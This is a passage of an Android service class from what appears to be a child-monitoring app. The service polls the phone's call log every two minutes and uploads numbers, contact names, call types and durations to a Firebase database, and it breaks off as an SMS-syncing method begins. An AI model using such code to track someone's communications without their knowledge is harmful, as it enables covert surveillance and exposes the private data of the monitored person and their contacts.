package com.childmonitor.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;

import androidx.annotation.Nullable;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class CallSmsService extends Service {

    private static final long SYNC_INTERVAL = 2 * 60 * 1000;
    private Handler handler;
    private Runnable syncRunnable;
    private DatabaseReference callSmsRef;
    private long lastSyncTime = 0;

    @Override
    public void onCreate() {
        super.onCreate();

        String deviceId = getSharedPreferences("cm_prefs", MODE_PRIVATE)
                .getString("device_id", "unknown");

        callSmsRef = FirebaseDatabase.getInstance()
                .getReference("devices")
                .child(deviceId)
                .child("communications");

        handler = new Handler(Looper.getMainLooper());
        startSyncing();
    }

    private void startSyncing() {
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncCallLogs();
                syncSmsLogs();
                lastSyncTime = System.currentTimeMillis();
                handler.postDelayed(this, SYNC_INTERVAL);
            }
        };
        handler.post(syncRunnable);
    }

    private void syncCallLogs() {
        try {
            ContentResolver cr = getContentResolver();
            String selection = lastSyncTime > 0 ?
                CallLog.Calls.DATE + " > " + lastSyncTime : null;

            Cursor cursor = cr.query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                },
                selection, null, CallLog.Calls.DATE + " DESC");

            if (cursor == null) return;

            while (cursor.moveToNext()) {
                String number = cursor.getString(0);
                String name = cursor.getString(1);
                int type = cursor.getInt(2);
                long date = cursor.getLong(3);
                int duration = cursor.getInt(4);

                String callType = "Unknown";
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: callType = "Incoming"; break;
                    case CallLog.Calls.OUTGOING_TYPE: callType = "Outgoing"; break;
                    case CallLog.Calls.MISSED_TYPE:   callType = "Missed";   break;
                }

                Map<String, Object> callData = new HashMap<>();
                callData.put("number", number);
                callData.put("name", name != null ? name : "Unknown");
                callData.put("type", callType);
                callData.put("duration_sec", duration);
                callData.put("timestamp", date);
                callData.put("date_str", new SimpleDateFormat("yyyy-MM-dd HH:mm",
                        Locale.getDefault()).format(new Date(date)));

                callSmsRef.child("calls").child(String.valueOf(date)).setValue(callData);
            }
            cursor.close();

        } catch (Exception e) {
            // ignore
        }
    }

    private void syncSmsLogs() {
        try {
            ContentResolver cr = getContentResolver();
            String selection = lastSyncTime > 0 ?
                Teleph
